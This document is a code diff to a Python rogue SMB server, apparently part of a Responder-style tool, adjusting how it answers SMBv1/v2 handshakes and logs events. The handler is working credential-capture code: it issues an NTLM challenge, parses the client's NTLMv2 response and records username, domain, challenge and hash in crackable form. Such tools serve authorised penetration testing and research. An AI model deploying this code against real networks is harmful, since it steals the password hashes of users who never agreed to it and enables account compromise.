@@ -181,20 +181,23 @@ class smb(TcpHandler):
         data = data[113:]
         LMhashLen = struct.unpack('<H',data[12:14])[0]
         LMhashOffset = struct.unpack('<H',data[16:18])[0]
-        LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
+        #LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
+        LMHash = to_string(SSPIStart[LMhashOffset:LMhashOffset+LMhashLen]).upper()
         NthashLen = struct.unpack('<H',data[22:24])[0]
         NthashOffset = struct.unpack('<H',data[24:26])[0]
-        SMBHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+        #SMBHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
+        SMBHash = to_string(SSPIStart[NthashOffset:NthashOffset+NthashLen]).upper()
         DomainLen = struct.unpack('<H',data[30:32])[0]
         DomainOffset = struct.unpack('<H',data[32:34])[0]
         Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
         UserLen      = struct.unpack('<H',data[38:40])[0]
         UserOffset   = struct.unpack('<H',data[40:42])[0]
         Username     = SSPIStart[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
-        WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, settings.Config.NumChal, SMBHash[:32], SMBHash[32:])
+        WriteHash    = '%s::%s:%s:%s:%s' % (Username, Domain, to_string(self.challenge), SMBHash[:32], SMBHash[32:])
         self.add_secret("Username", Domain+'\\'+Username)
         self.add_secret("Hash", SMBHash)
         self.add_secret("Client", client)
+        self.add_secret("Challenge", to_string(self.challenge))
         self.add_secret("NTLMv2-SSP Hash", WriteHash)
         #SaveToDb({
         #            'module': 'SMBv2', 
@@ -233,60 +236,62 @@ class smb(TcpHandler):
             ############################## SMBv2 ##############################
             ##Negotiate proto answer SMBv2.         
             if data[8:10] == b"\x72\x00" and re.search(b"SMB 2.\?\?\?", data):
+                self.debug("SMBv2: Negotiate proto answer SMBv2.")
                 head = SMB2Header(CreditCharge=b"\x00\x00",Credits=b"\x01\x00")
                 t = SMB2NegoAns()
                 t.calculate()
                 packet = self.build_packet(head, t)
                 self.send_response(packet)
-                self.debug("SMBv2: Session Setup 1 answer SMBv2.")
                 data = self.handle_raw_request()
+                
             ## Session Setup 1 answer SMBv2.
             if data[16:18] == b"\x00\x00" and data[4:5] == b"\xfe":
+                self.debug("SMBv2: Session Setup 1 answer SMBv2.")
                 head = SMB2Header(MessageId=self.GrabMessageID(data), PID=b"\xff\xfe\x00\x00", CreditCharge=self.GrabCreditCharged(data), Credits=self.GrabCreditRequested(data))
                 t = SMB2NegoAns(Dialect=b"\x10\x02")
                 t.calculate()
                 packet = self.build_packet(head, t)
+                print(repr(packet))
                 self.send_response(packet)
-                self.debug("SMBv2: Session Setup 1 answer SMBv2.")
                 data = self.handle_raw_request()
+                
             ## Session Setup 2 answer SMBv2.
             if data[16:18] == b"\x01\x00" and data[4:5] == b"\xfe":
+                self.debug("SMBv2: Session Setup 2 answer SMBv2.")
                 head = SMB2Header(Cmd=b"\x01\x00", MessageId=self.GrabMessageID(data), PID=b"\xff\xfe\x00\x00", CreditCharge=self.GrabCreditCharged(data), Credits=self.GrabCreditRequested(data), SessionID=self.GrabSessionID(data),NTStatus=b"\x16\x00\x00\xc0")
                 t = SMB2Session1Data(NTLMSSPNtServerChallenge=self.challenge)
                 t.calculate()
                 packet = self.build_packet(head, t)
                 self.send_response(packet)
-                self.debug("SMBv2: Session Setup 2 answer SMBv2.")
                 data = self.handle_raw_request()
+                
             ## Session Setup 3 answer SMBv2.
-            if data[16:18] == b"\x01\x00" and GrabMessageID(data)[0:1] == b"\x02" and data[4:5] == b"\xfe":
+            if data[16:18] == b"\x01\x00" and self.GrabMessageID(data)[0:1] == b"\x02" and data[4:5] == b"\xfe":
+                self.debug("SMBv2: Session Setup 3 answer SMBv2.")
                 self.ParseSMB2NTLMv2Hash(data, self.client_address[0])
                 head = SMB2Header(Cmd=b"\x01\x00", MessageId=self.GrabMessageID(data), PID=b"\xff\xfe\x00\x00", CreditCharge=self.GrabCreditCharged(data), Credits=self.GrabCreditRequested(data), NTStatus=b"\x22\x00\x00\xc0", SessionID=self.GrabSessionID(data))
                 t = SMB2Session2Data()
                 packet = self.build_packet(head, t)
                 self.send_response(packet)
-                self.debug("SMBv2: Session Setup 3 answer SMBv2.")
                 data = self.handle_raw_request()
             
             ############################## SMBv1 ##############################
             ##Negotiate proto answer.
-            if data[8:10] == b"\x72\x00" and data[4:5] == b"\xff":
-                self.debug("SMBv1: Negotiate Protocol - RECIEVED")
+            if data[8:10] == b"\x72\x00" and data[4:5] == b"\xff" and re.search(b"SMB 2.\?\?\?", data) == None:
+                self.debug("SMBv1: Negotiate Protocol")
                 Header = SMBHeader(cmd=b"\x72",flag1=b"\x88", flag2=b"\x01\xc8", pid=self.pidcalc(data), mid=self.midcalc(data))
                 Body = SMBNegoKerbAns(Dialect=self.Parse_Nego_Dialect(data))
                 Body.calculate()
                 packet = self.build_packet(Header, Body)
                 self.send_response(packet)
-                self.debug("SMBv1: Negotiate Protocol - RESPONSE SENT")
                 data = self.handle_raw_request()
                 
             if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # Session Setup AndX Request smbv1
-                self.debug("SMBv1: Session Setup AndX - RECIEVED")
+                self.debug("SMBv1: Session Setup AndX")
                 self.IsNT4ClearTxt(data, self.client_address[0])
                 
                 # STATUS_MORE_PROCESSING_REQUIRED
                 Header = SMBHeader(cmd=b"\x73",flag1=b"\x88", flag2=b"\x01\xc8", errorcode=b"\x16\x00\x00\xc0", uid=bytes([randrange(256)])+bytes([randrange(256)]),pid=self.pidcalc(data),tid=b"\x00\x00",mid=self.midcalc(data))
-                print(repr(bytes(Header)))
                 #if settings.Config.CaptureMultipleCredentials and self.ntry == 0:
                 #    Body = SMBSession1Data(NTLMSSPNtServerChallenge=settings.Config.Challenge, NTLMSSPNTLMChallengeAVPairsUnicodeStr="NOMATCH")
                 #else:
@@ -294,7 +299,6 @@ class smb(TcpHandler):
                 Body.calculate()
                 packet = self.build_packet(Header, Body)
                 self.send_response(packet)
-                self.debug("SMBv1: Session Setup AndX - RESPONSE SENT")
                 data = self.handle_raw_request()
                 
             if data[8:10] == b"\x73\x00" and data[4:5] == b"\xff":  # STATUS_SUCCESS
@@ -317,7 +321,6 @@ class smb(TcpHandler):
 
                     packet = self.build_packet(Header, Body)
                     self.send_response(packet)
-                    self.debug("SMBv1: STATUS_SUCCESS - SENT")
                     data = self.handle_raw_request()
                     
             if data[8:10] == b"\x75\x00" and data[4:5] == b"\xff":  # Tree Connect AndX Request
@@ -329,45 +332,44 @@ class smb(TcpHandler):
 
                 packet = self.build_packet(Header, Body)
                 self.send_response(packet)
-                self.debug("SMBv1: Tree Connect AndX Response - SENT")
                 data = self.handle_raw_request()
                 
                 #Check for Trans2 request
                 
             if data[8:10] == b"\x71\x00" and data[4:5] == b"\xff":  #Tree Disconnect
+                self.debug("SMBv1: Tree Disconnect")
                 Header = SMBHeader(cmd=b"\x71",flag1=b"\x98", flag2=b"\x07\xc8", errorcodeb="\x00\x00\x00\x00",pid=self.pidcalc(data),tid=self.tidcalc(data),uid=self.uidcalc(data),mid=self.midcalc(data))
                 Body = "\x00\x00\x00"
 
                 packet = self.build_packet(Header, Body)
                 self.send_response(packet)
-                self.debug("SMBv1: Tree Disconnect - SENT")
                 data = self.handle_raw_request()
 
             if data[8:10] == b"\xa2\x00" and data[4:5] == b"\xff":  #NT_CREATE Access Denied.
+                self.debug("SMBv1: NT_CREATE Access Denied")
                 Header = SMBHeader(cmd=b"\xa2",flag1=b"\x98", flag2=b"\x07\xc8", errorcode=b"\x22\x00\x00\xc0",pid=self.pidcalc(data),tid=self.tidcalc(data),uid=self.uidcalc(data),mid=self.midcalc(data))
                 Body = b"\x00\x00\x00"
 
                 packet = self.build_packet(Header, Body)
                 self.send_response(packet)
-                self.debug("SMBv1: NT_CREATE Access Denied - SENT")
                 data = self.handle_raw_request()
 
             if data[8:10] == b"\x25\x00" and data[4:5] == b"\xff":  # Trans2 Access Denied.
+                self.debug("SMBv1: Trans2 Access Denied")
                 Header = SMBHeader(cmd=b"\x25",flag1=b"\x98", flag2=b"\x07\xc8", errorcode=b"\x22\x00\x00\xc0",pid=self.pidcalc(data),tid=self.tidcalc(data),uid=self.uidcalc(data),mid=self.midcalc(data))
                 Body = b"\x00\x00\x00"
 
                 packet = self.build_packet(Header, Body)
                 self.send_response(packet)
-                self.debug("SMBv1: Trans2 Access Denied - SENT")
                 data = self.handle_raw_request()
             
             if data[8:10] == b"\x74\x00" and data[4:5] == b"\xff":  # LogOff
+                self.debug("SMBv1: Logoff")
                 Header = SMBHeader(cmd=b"\x74",flag1=b"\x98", flag2=b"\x07\xc8", errorcode=b"\x22\x00\x00\xc0",pid=self.pidcalc(data),tid=self.tidcalc(data),uid=self.uidcalc(data),mid=self.midcalc(data))
                 Body = b"\x02\xff\x00\x27\x00\x00\x00"
 
                 packet = self.build_packet(Header, Body)
                 self.send_response(packet)
-                self.debug("SMBv1: Logoff - SENT")
                 data = self.handle_raw_request()
             ###################################################################
             
